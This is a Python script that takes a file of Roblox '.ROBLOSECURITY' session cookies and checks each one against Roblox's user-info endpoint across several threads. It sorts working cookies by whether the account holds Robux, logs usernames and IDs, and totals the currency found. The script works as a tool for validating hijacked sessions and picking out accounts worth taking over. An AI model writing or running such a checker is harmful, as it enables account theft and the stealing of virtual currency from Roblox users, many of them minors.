import requests, ctypes
import threading
from threading import Thread

cookies = open('cookies.txt','r',encoding='utf-8',errors='ignore').read().splitlines()

total = len(cookies)
checked = 0
valid = 0
invalid = 0
totalrobux = 0
threadc = int(input('Enter threads: '))

def title():
    while True:
        ctypes.windll.kernel32.SetConsoleTitleW(f'{total}/{checked} - Valid: {valid} - Invalid: {invalid} - Total Robux: {totalrobux}')

def divide(stuff):
    return [stuff[i::threadc] for i in range(threadc)]

def main(cookies):
    global checked
    global totalrobux
    global valid
    global invalid
    for c in cookies:
        try:
            req = requests.Session()
            req.cookies['.ROBLOSECURITY'] = c
            r = req.get('https://www.roblox.com/mobileapi/userinfo')
            print(r.text)
            if 'User' in r.text:
                valid += 1
                robux = int(r.json()['RobuxBalance'])
                userid = str(r.json()['UserID'])
                username = str(r.json()['UserName'])
                totalrobux += robux
                if robux >= 1:
                    with open('robux.txt','a',encoding='utf-8',errors='ignore') as p:
                        p.writelines(c+'\n')
                    with open('userandid.txt','a',encoding='utf-8',errors='ignore') as p:
                        p.writelines(username+':'+userid+'\n')
                elif robux == 0:
                    with open('norobux.txt','a',encoding='utf-8',errors='ignore') as p:
                        p.writelines(c+'\n')
                    with open('userandid.txt','a',encoding='utf-8',errors='ignore') as p:
                        p.writelines(username+':'+userid+'\n')
                with open('valid.txt','a',encoding='utf-8',errors='ignore') as p:
                        p.writelines(c+'\n')
            else:
                invalid += 1
        except: pass
        checked += 1
    
threading.Thread(target=title).start()

threads = []
for i in range(threadc):
    threads.append(Thread(target=main,args=[divide(cookies)[i]]))
    threads[i].start()
for thread in threads:
    thread.join()